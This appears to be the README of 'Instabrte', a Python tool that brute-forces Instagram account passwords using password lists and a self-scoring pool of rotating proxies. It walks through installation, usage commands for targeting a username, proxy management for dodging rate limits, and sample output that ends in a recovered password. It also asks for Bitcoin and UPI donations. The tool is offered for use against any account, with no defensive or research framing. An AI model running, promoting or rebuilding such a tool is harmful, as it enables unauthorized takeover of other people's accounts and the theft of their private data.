# Instabrte

[![Version](https://img.shields.io/badge/Version-3.1.0-green)]()
[![Python](https://img.shields.io/badge/Python-v3.9-yellow)]()
[![Discord](https://img.shields.io/badge/Telegram-blue)](https://t.me/bhaskarvilles)
[![Donate](https://img.shields.io/badge/PayPal-donate-orange)](https://www.bhaskarvilles.live/donate.html)

This program will brute force any Instagram account you send it its way given a list of proxies.

### Support

It motivates me to keep updating this program.


>**Bitcoin:** 195DLtMLCU78zedUDSkZQgUMzaEyffPwsN

>**UPI:** bhaskarfederal@axl

## Requirements

- Python _v3.9_
- proxy list

## Install Dependencies

### Install Pipenv

```
pip install pipenv
```

### Create environment

Make sure you have Python 3.9 installed

```
pipenv --python 3.9
```

### Install Requirements

```
pipenv install
```

## Help

```
usage: instabrte.py [-h] [-u USERNAME] [-p PASSLIST] [-px PROXYLIST] [--prune PRUNE] [--stats] [-nc] [-m MODE]

optional arguments:
  -h, --help            show this help message and exit
  -u USERNAME, --username USERNAME
                        email or username
  -p PASSLIST, --passlist PASSLIST
                        password list
  -px PROXYLIST, --proxylist PROXYLIST
                        proxy list
  --prune PRUNE         prune the database
  --stats               get statistics of the proxies
  -nc, --no-color       disable colors
  -m MODE, --mode MODE  modes: 0 => 32 bots; 1 => 16 bots; 2 => 8 bots; 3 => 4 bots
```

## Proxies

The system needs a list of proxies to work. Once uploaded, proxies are saved into a database.<br/>

### Upload
```
python instabrte.py -px <path to proxy list>
```

### Stats

This gives an insight into the health of the proxies in the database.

```
python instabrte.py --stats
```

### Prune

This allows the able to get rid of proxies with a score below a given score.<br/>
It is recommended that you run the `--stats` and prune the database of proxies<br/>
who have a proxy score below `Q1`.

```
python instabrte.py --prune 0.05
```

Pruning is not a requirement because the <br/>
the system will automatically learn which proxies perform poorly and stop using them.

### Usage

```
python instabrte.py -u <username> -p <passlist>
```

### Run

```
[-] Wordlist: passlist.txt
[-] Username: XXXXXXX
[-] Password: 272
[-] Complete: 45.51%
[-] Attempts: 228
[-] Browsers: 273
[-] Exists: True
```

### Stop

```
[-] Wordlist: passlist.txt
[-] Username: XXXXXXX
[-] Password: XXXXXXX
[-] Complete: 62.67%
[-] Attempts: 314
[-] Browsers: 185
[-] Exists: True

[!] Password Found
[+] Username: XXXXXXX
[+] Password: XXXXXXX
```
